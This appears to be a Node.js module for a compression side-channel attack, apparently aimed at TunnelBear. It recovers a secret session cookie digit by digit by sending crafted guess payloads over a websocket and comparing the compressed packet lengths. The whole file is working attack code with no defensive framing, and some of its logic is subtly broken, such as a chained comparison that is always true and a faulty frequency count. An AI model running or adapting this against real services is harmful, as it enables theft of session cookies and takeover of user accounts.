// specific to tunnelbear
const asyncForEach = require('async-foreach').forEach
const EventEmitter = require('events')
const config = require('./config.json')

// would also contain secret
const url = config.url
const bodyPrefix = '' // 'Cookie: sessionId=876123219; blah blah blah;'
const secretPrefix = 'Cookie: ' + config.secretPrefix
const chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
let finalSecret = ''
let ws = null

const sendPayload = (url, payload, done) => {
  if (ws === null) return
  ws.send(JSON.stringify({url: url.toString(), payload: payload.toString(), finalSecret: finalSecret, secretLength: config.secretLength, secretPrefix: config.secretPrefix}))
  if (done) setTimeout(done, 300)
  // request.post({
  //   'url': url.toString(),
  //   'body': payload.toString()
  // }, (err, res, body) => {
  //   if (done) done()
  // })
}

const generateGuessSequences = (secretPrefix, guess) => {
  // repeat = 3
  return secretPrefix + guess + '--' + secretPrefix + guess + '__' + secretPrefix + guess + '--' + 'hello' + getRandomString().substr(0, 5)
}

const getRandomString = () => {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
}

// const randomString = getRandomString() + getRandomString() + getRandomString()
// const randomString = 'yyuljtygzvfyo49eq8lnuvmhmzgyow4r5fh8afsqr0szglv7gppm1f1rs7zuvv13y'
const randomString = ' '

const init = (websocket) => {
  finalSecret = ''
  ws = websocket
  const ee = new EventEmitter()
  let baseLength = 0
  // ee.on('packet_length', )
  getBaseLength(ee, (bl) => {
    baseLength = bl
    ee.removeAllListeners()
    console.log('base length:' + baseLength)
    guessAllOracles(ee, baseLength, secretPrefix, (secret) => {
      console.log('secret: ', secret)
      ee.removeAllListeners()
    })
  })
  return ee
}

const deInit = (ee) => {
  if (ee) { ee.removeAllListeners() }
}

const guessAllOracles = (ee, bl, guessedSecretPrefix, done) => {
  guessOracle(ee, bl, guessedSecretPrefix, (guessed) => {
    bl += 1
    console.log('guessed: ', guessed)
    finalSecret += guessed.toString()
    if (finalSecret.length <= config.secretLength) {
      guessAllOracles(ee, bl, guessedSecretPrefix + guessed, done)
    } else {
      ws = null
      return done(finalSecret)
    }
  })
}

const guessOracle = (ee, bl, guessedSecretPrefix, cb) => {
  // get first character
  const min = bl - 2
  const max = bl + 2
  let packetArr = []

  ee.on('packet_length', (len) => {
    if (min <= bl <= max) {
      console.log(len)
      packetArr.push(len)
      if (packetArr.length === chars.length) {
        const guessed = packetArr.indexOf(Math.min(...packetArr))
        ee.removeAllListeners()
        cb(guessed)
      }
    }
  })

  asyncForEach(chars, function (guess) {
    const done = this.async()
    let payload = bodyPrefix + generateGuessSequences(guessedSecretPrefix, guess.toString()) + ' ' + randomString
    setTimeout(() => {
      sendPayload(url, payload.toString(), () => {
        done()
      })
    }, 300)
  })
}

// the length of the payload before the brute-force
// send a packet 5 times and the length which repeats most is the length
const getBaseLength = (ee, done) => {
  const times = 5
  let count = 0
  const freq = {}
  for (let i = 0; i < times; i++) {
    const payload = bodyPrefix + generateGuessSequences(secretPrefix, '!') + ' ' + randomString
    console.log('getBaseLength: sending.. ' + payload)
    setTimeout(() => {
      sendPayload(url, payload)
    }, i * 500)
  }
  ee.on('packet_length', (len) => {
    len = len.toString()
    console.log('possible base_len: ', len)
    if (count++ > times) return
    // base length is the one with the max count
    if (count === times) {
      let max = 0
      let maxKey = 0
      Object.keys(freq).forEach(k => {
        if (k > max) {
          max = freq[k]
          maxKey = k
        }
      })
      return done(maxKey)
    }
    if (freq[len] !== undefined) {
      freq[len] += 1
    } else {
      freq[len] = 0
    }
  })
}

// doDaThing()

module.exports = {
  'init': init,
  'deInit': deInit
}
